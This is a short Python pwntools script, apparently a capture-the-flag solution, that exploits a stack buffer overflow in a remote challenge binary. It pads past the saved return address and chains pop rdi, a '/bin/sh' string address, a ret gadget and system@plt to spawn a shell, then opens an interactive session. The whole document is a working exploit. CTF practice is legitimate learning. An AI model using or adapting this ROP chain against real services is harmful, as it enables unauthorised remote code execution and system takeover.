from pwn import *
p = remote("gz.imxbt.cn",20368)
elf = ELF("./我把她丢了")


offset = 0x70 + 8

system= elf.plt["system"]
ret = 0x000000000040101a
pop_rdi = 0x0000000000401196
bin_sh = 0x0000000000402008

print(hex(system))

payload = b'a'*(offset) + p64(pop_rdi)   +p64(bin_sh) + p64(ret)+ p64(system)

p.sendline(payload)

p.interactive()